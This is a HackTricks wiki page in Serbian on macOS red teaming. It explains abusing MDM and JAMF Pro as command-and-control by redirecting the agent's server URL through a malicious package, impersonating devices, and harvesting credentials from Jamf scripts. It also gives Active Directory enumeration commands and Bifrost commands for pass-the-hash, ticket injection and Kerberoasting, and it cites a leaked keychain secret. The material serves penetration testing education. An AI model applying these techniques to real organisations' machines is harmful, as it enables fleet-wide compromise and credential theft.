# macOS Red Teaming

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### Dobijte perspektivu hakera o vašim web aplikacijama, mreži i cloudu

**Pronađite i prijavite kritične, eksploatabilne ranjivosti sa stvarnim poslovnim uticajem.** Koristite naših 20+ prilagođenih alata za mapiranje napadačke površine, pronalaženje sigurnosnih problema koji vam omogućavaju da eskalirate privilegije, i koristite automatizovane eksploate za prikupljanje suštinskih dokaza, pretvarajući vaš težak rad u uverljive izveštaje.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Zloupotreba MDM-a

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

Ako uspete da **kompromitujete administratorske akreditive** za pristup upravljačkoj platformi, možete **potencijalno kompromitovati sve računare** distribuiranjem vašeg malvera na mašinama.

Za red teaming u MacOS okruženjima, veoma je preporučljivo imati neko razumevanje kako MDM-ovi funkcionišu:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### Korišćenje MDM-a kao C2

MDM će imati dozvolu da instalira, upita ili ukloni profile, instalira aplikacije, kreira lokalne administratorske naloge, postavi firmware lozinku, menja FileVault ključ...

Da biste pokrenuli svoj MDM, potrebno je da **vaš CSR potpiše dobavljač** što možete pokušati da dobijete putem [**https://mdmcert.download/**](https://mdmcert.download/). A da biste pokrenuli svoj MDM za Apple uređaje, možete koristiti [**MicroMDM**](https://github.com/micromdm/micromdm).

Međutim, da biste instalirali aplikaciju na registrovanom uređaju, i dalje je potrebno da bude potpisana od strane developerskog naloga... međutim, prilikom MDM registracije, **uređaj dodaje SSL certifikat MDM-a kao pouzdanu CA**, tako da sada možete potpisati bilo šta.

Da biste registrovali uređaj u MDM, potrebno je da instalirate **`mobileconfig`** datoteku kao root, koja se može isporučiti putem **pkg** datoteke (možete je kompresovati u zip, a kada se preuzme iz safarija, biće dekompresovana).

**Mythic agent Orthrus** koristi ovu tehniku.

### Zloupotreba JAMF PRO

JAMF može pokretati **prilagođene skripte** (skripte koje razvija sysadmin), **nativne payload-e** (kreiranje lokalnog naloga, postavljanje EFI lozinke, praćenje datoteka/procesa...) i **MDM** (konfiguracije uređaja, sertifikati uređaja...).

#### JAMF samoregistracija

Idite na stranicu kao što je `https://<company-name>.jamfcloud.com/enroll/` da vidite da li imaju **omogućenu samoregistraciju**. Ako imaju, možda će **tražiti akreditive za pristup**.

Možete koristiti skriptu [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) da izvršite napad na lozinke.

Štaviše, nakon pronalaženja odgovarajućih akreditiva, mogli biste biti u mogućnosti da brute-force-ujete druge korisničke naloge sa sledećim obrascem:

![](<../../.gitbook/assets/image (107).png>)

#### JAMF autentifikacija uređaja

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** binarni fajl sadrži tajnu za otvaranje keychain-a koja je u vreme otkrića bila **deljena** među svima i to je bila: **`jk23ucnq91jfu9aj`**.\
Štaviše, jamf **persistira** kao **LaunchDaemon** u **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Preuzimanje JAMF uređaja

**JSS** (Jamf Software Server) **URL** koji će **`jamf`** koristiti nalazi se u **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Ova datoteka u suštini sadrži URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
{% endcode %}

Dakle, napadač bi mogao da postavi zlonamerni paket (`pkg`) koji **prepisuje ovu datoteku** prilikom instalacije postavljajući **URL na Mythic C2 slušalac iz Typhon agenta** kako bi sada mogao da zloupotrebi JAMF kao C2.

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### JAMF Impersonacija

Da biste **imitirali komunikaciju** između uređaja i JMF-a, potrebno je:

* **UUID** uređaja: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* **JAMF ključanica** iz: `/Library/Application\ Support/Jamf/JAMF.keychain` koja sadrži sertifikat uređaja

Sa ovom informacijom, **napravite VM** sa **ukradenim** Hardver **UUID** i sa **onemogućenim SIP**, prebacite **JAMF ključanicu,** **priključite** Jamf **agent** i ukradite njegove informacije.

#### Krađa tajni

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Takođe možete pratiti lokaciju `/Library/Application Support/Jamf/tmp/` za **prilagođene skripte** koje administratori možda žele da izvrše putem Jamf-a, jer su **ovde smeštene, izvršene i uklonjene**. Ove skripte **mogu sadržati akreditive**.

Međutim, **akreditivi** se mogu proslediti ovim skriptama kao **parametri**, pa biste trebali pratiti `ps aux | grep -i jamf` (čak i bez da budete root).

Skripta [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) može slušati nove datoteke koje se dodaju i nove argumente procesa.

### macOS Daljinski Pristup

I takođe o **MacOS** "posebnim" **mrežnim** **protokolima**:

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## Aktivni Direktorijum

U nekim slučajevima ćete otkriti da je **MacOS računar povezan sa AD**. U ovom scenariju trebali biste pokušati da **enumerišete** aktivni direktorijum kao što ste navikli. Pronađite neku **pomoć** na sledećim stranicama:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

Neki **lokalni MacOS alat** koji vam takođe može pomoći je `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Takođe postoje neki alati pripremljeni za MacOS koji automatski enumerišu AD i igraju se sa kerberosom:

* [**Machound**](https://github.com/XMCyber/MacHound): MacHound je ekstenzija za Bloodhound alat za reviziju koja omogućava prikupljanje i unos odnosa Active Directory na MacOS hostovima.
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost je Objective-C projekat dizajniran za interakciju sa Heimdal krb5 API-ima na macOS-u. Cilj projekta je omogućiti bolje testiranje bezbednosti oko Kerberosa na macOS uređajima koristeći nativne API-je bez potrebe za bilo kojim drugim okvirom ili paketima na meti.
* [**Orchard**](https://github.com/its-a-feature/Orchard): JavaScript za automatizaciju (JXA) alat za izvršavanje enumeracije Active Directory.

### Informacije o domeni
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Korisnici

Tri tipa MacOS korisnika su:

* **Lokalni korisnici** — Upravlja ih lokalna OpenDirectory usluga, nisu povezani na bilo koji način sa Active Directory.
* **Mrežni korisnici** — Volatilni Active Directory korisnici koji zahtevaju vezu sa DC serverom za autentifikaciju.
* **Mobilni korisnici** — Active Directory korisnici sa lokalnom rezervnom kopijom svojih kredencijala i fajlova.

Lokalne informacije o korisnicima i grupama se čuvaju u folderu _/var/db/dslocal/nodes/Default._\
Na primer, informacije o korisniku pod imenom _mark_ se čuvaju u _/var/db/dslocal/nodes/Default/users/mark.plist_ a informacije o grupi _admin_ su u _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Pored korišćenja HasSession i AdminTo ivica, **MacHound dodaje tri nove ivice** u Bloodhound bazu podataka:

* **CanSSH** - entitet kojem je dozvoljeno SSH na host
* **CanVNC** - entitet kojem je dozvoljeno VNC na host
* **CanAE** - entitet kojem je dozvoljeno izvršavanje AppleEvent skripti na host
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Više informacija na [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ lozinka

Dobijte lozinke koristeći:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Moguće je pristupiti **`Computer$`** lozinki unutar System keychain-a.

### Over-Pass-The-Hash

Dobijte TGT za specifičnog korisnika i uslugu:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Kada se TGT prikupi, moguće je ubrizgati ga u trenutnu sesiju sa:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Sa dobijenim servisnim tiketima moguće je pokušati pristupiti deljenjima na drugim računarima:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Pristupanje Keychain-u

Keychain verovatno sadrži osetljive informacije koje, ako se pristupi bez generisanja obaveštenja, mogu pomoći u napredovanju vežbe crvenog tima:

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## Spoljni servisi

MacOS Red Teaming se razlikuje od regularnog Windows Red Teaming-a jer obično **MacOS je integrisan sa nekoliko spoljnih platformi direktno**. Uobičajena konfiguracija MacOS-a je pristup računaru koristeći **OneLogin sinhronizovane akreditive, i pristupanje nekoliko spoljnih servisa** (kao što su github, aws...) putem OneLogin-a.

## Razne tehnike crvenog tima

### Safari

Kada se fajl preuzme u Safariju, ako je to "siguran" fajl, biće **automatski otvoren**. Tako da, na primer, ako **preuzmete zip**, biće automatski raspakovan:

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## Reference

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### Dobijte perspektivu hakera o vašim web aplikacijama, mreži i cloudu

**Pronađite i prijavite kritične, iskoristive ranjivosti sa stvarnim poslovnim uticajem.** Koristite naših 20+ prilagođenih alata za mapiranje napadačke površine, pronalaženje sigurnosnih problema koji vam omogućavaju da eskalirate privilegije, i koristite automatske eksploate za prikupljanje suštinskih dokaza, pretvarajući vaš trud u uverljive izveštaje.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
